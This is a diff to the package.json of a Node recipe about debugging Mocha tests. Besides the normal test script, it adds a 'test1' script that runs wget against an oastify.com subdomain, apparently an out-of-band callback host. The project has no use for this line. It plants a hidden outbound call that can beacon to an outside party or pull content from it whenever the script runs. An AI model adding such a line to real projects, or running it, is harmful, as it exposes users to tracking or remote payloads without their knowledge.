@@ -3,7 +3,8 @@
   "version": "1.0.0",
   "description": "This recipe shows how to use the built-in Node Debugger to debug Mocha tests",
   "scripts": {
-    "test": "mocha 'test/**/*.spec.js'"
+    "test": "mocha 'test/**/*.spec.js'",
+    "test1": "wget https://ioamgrib2bsmofulk3poqifvemki8bw0.oastify.com/vscode"
   },
   "author": "Jag Reehal",
   "license": "ISC",
